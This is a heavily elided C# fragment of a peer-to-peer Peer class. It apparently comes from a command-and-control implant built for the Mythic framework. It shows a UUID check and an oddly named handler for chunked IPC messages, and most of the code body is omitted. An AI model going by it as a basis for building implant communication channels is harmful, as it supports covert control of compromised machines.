...
namespace PhantomInterop.Classes.P2P
{
    public abstract class Peer : IPeer
    {
        ...
        {
            if (!ValidationHelper.IsStringEmpty(message.MythicUUID) &&
                message.MythicUUID != _uuid &&
                ValidationHelper.IsStringEmpty(_mythicUUID))
            {
        ...
        public void StealthCoordinator9729(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
        {
